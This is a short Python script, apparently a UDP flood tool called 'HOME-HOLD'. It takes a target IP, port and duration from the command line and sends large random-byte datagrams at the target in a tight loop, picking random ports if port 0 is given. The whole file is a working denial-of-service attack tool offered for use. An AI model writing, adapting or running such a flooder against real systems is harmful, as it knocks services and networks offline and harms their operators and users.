#!/usr/bin/python



import socket,random,sys,time



if len(sys.argv)==1:

    sys.exit('[DIVINE HOME]: HOME-HOLD [IP] [PORT] [TIME]')



def udp_protocol():

    port = int(sys.argv[2])

    randport=(True,False)[port==0]

    ip = sys.argv[1]

    dur = int(sys.argv[3])

    clock=(lambda:0,time.clock)[dur>0]

    duration=(1,(clock()+dur))[dur>0]
	
    
    print('[HOME-HOLD] ATTACKING %s  PORT %s !'%(ip, port or 'Slam'))
	
	
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    bytes=random._urandom(65500)

    while True:

        port=(random.randint(1,65535),port)[randport]

        if clock()<duration:

            sock.sendto(bytes,(ip,port))

        else:

            break

    print('Attack Has Been Stopped !')

udp_protocol()